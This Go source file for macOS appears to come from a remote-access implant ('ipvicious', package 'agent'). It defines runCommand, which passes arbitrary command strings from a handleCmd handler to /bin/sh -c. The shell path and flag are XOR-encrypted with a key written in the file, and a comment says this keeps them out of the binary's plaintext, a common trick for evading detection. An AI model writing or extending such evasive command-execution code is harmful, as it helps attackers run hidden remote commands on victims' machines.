//go:build darwin

// Package agent – shell_darwin.go provides the macOS-specific shell invocation for the
// runCommand helper used by handleCmd.
package agent

import (
	"bytes"
	"os/exec"

	"ipvicious/internal/crypto"
)

// Pre-encrypted shell strings – avoids plaintext in the binary.
// Generated with: go run ./tools/strenc "<value>"
// Key: {0xA7,0x3F,0x1E,0x92,0xC4,0x5D,0x8B,0x2A,0x6F,0xE3,0x47,0xB8,0xD1,0x09,0x7C,0x5E}

// "/bin/sh"
var _eShell = []byte{0x88, 0x5D, 0x77, 0xFC, 0xEB, 0x2E, 0xE3}

// "-c"
var _eFlagC = []byte{0x8A, 0x5C}

// runCommand executes cmd via /bin/sh -c and returns combined stdout+stderr.
func runCommand(cmd string) ([]byte, error) {
	shell := crypto.Dec(_eShell) // "/bin/sh"
	flag := crypto.Dec(_eFlagC) // "-c"

	c := exec.Command(shell, flag, cmd)
	var buf bytes.Buffer
	c.Stdout = &buf
	c.Stderr = &buf
	return buf.Bytes(), c.Run()
}
